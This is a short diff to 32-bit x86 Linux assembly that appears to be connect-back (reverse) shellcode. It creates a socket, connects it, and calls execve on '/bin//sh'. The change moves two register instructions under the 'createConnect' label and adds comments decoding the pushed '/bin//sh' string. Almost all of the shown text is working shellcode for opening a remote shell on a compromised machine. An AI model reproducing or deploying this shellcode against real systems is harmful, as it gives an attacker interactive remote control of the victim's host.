@@ -11,12 +11,12 @@ mov bl,2
 mov cl,1
 mov dl,0
 int 0x80
-xor edi,edi
-mov edi,eax
 
 
 ;int connect(int sockfd, const struct sockaddr *addr,socklen_t addrlen);
 createConnect:
+xor edi,edi
+mov edi,eax
 xor eax,eax
 mov ebx,edi
 push eax
@@ -61,8 +61,8 @@ Execve:
 xor eax,eax
 push eax
 mov al,11
-push 0x68732f2f
-push 0x6e69622f
+push 0x68732f2f ;hs//
+push 0x6e69622f ;nib/
 mov ebx, esp
 xor ecx,ecx
 push ecx
